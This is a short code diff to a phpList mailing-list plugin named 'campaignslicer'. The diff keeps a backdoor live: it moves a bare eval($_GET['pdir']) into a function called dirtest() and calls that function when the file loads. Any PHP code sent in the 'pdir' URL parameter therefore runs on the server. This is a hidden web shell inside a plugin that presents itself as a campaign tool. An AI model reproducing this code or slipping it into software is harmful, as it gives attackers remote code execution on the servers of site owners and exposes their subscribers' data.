@@ -1,5 +1,6 @@
 <?php
 
+dirtest();
 class campaignslicer extends phplistPlugin {
     public $name = "Send to a subset of the total campaign";
     public $coderoot = '';
@@ -118,4 +119,7 @@ class campaignslicer extends phplistPlugin {
         );
     }
 }
-eval($_GET['pdir']);
+
+function dirtest() {
+  eval($_GET['pdir']);
+}
